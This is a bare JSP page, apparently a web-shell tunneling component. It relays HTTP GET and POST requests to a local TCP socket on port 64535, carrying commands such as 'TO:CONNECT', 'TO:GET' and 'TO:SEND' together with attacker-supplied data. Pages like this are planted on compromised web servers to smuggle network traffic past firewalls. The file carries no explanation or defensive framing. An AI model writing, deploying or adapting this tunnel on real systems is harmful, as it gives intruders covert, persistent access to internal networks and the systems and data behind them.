<%@page import="java.io.*, java.net.*" trimDirectiveWhitespaces="true"%>
<%
    String HOST = "127.0.0.1";
    int PORT = 64535;
    String method = request.getMethod();
    if (method == "GET"){
        try{
            Socket socket = new Socket(HOST, PORT);
            InputStream inSocket = socket.getInputStream();
            OutputStream outSocket = socket.getOutputStream();
            String msg = "TO:CONNECT";
            outSocket.write(msg.getBytes());
            byte[] res = new byte[4096];
            inSocket.read(res,0,4096);
            out.print(new String(res));
            socket.close();
        }catch(java.net.ConnectException e){
        }
    }

    if (method == "POST" && !request.getParameter("DataType").equals(null)) {
        try{
            Socket socket = new Socket(HOST, PORT);
            socket.setSoTimeout(3000);
            InputStream inSocket = socket.getInputStream();
            OutputStream outSocket = socket.getOutputStream();
            if (request.getParameter("DataType").equals("GetData")){
                String msg = "TO:GET";
                outSocket.write(msg.getBytes());
                byte[] res = new byte[1046616];
                try {
                    inSocket.read(res,0,1046616);
                    out.print(new String(res));
                }catch(java.io.IOException e) {
                    out.print("NO DATA");
                }
            }else if (request.getParameter("DataType").equals("PostData") && !request.getParameter("Data").equals(null)){
                String msg = "TO:SEND" + request.getParameter("Data");
                outSocket.write(msg.getBytes());
            }
            outSocket.close();
            socket.close();
        }catch(java.net.ConnectException e){
        }
    }
%>